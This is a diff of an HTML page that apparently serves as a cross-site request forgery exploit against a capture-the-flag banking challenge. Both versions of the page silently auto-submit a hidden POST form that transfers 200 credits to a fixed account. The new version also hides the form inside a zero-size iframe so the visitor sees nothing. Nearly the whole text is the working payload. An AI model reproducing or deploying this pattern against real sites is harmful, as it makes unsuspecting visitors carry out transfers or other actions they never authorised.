@@ -11,11 +11,14 @@
         <header>
         </header>
         <main>
-            <form id="my_form" method='POST' action='http://upcredit3.chall.malicecyber.com/transfer'>
-              <input type='hidden' name='account' value='x3ptbKlPJ'/>
-              <input type='hidden' name='amount' value='200'/>
-            </form>
-            <script>document.getElementById("my_form").submit();</script>
+            <iframe src="http://upcredit3.chall.malicecyber.com" style="width:0;height:0;border:0;border:none;">
+                <body onload="document.getElementById("my_form").submit()">
+                    <form id="my_form" method='POST' action='http://upcredit3.chall.malicecyber.com/transfer'>
+                     <input type='hidden' name='account' value='x3ptbKlPJ'/>
+                     <input type='hidden' name='amount' value='200'/>
+                    </form>
+                </body>
+            </iframe>
         </main>
         <footer>
         </footer>
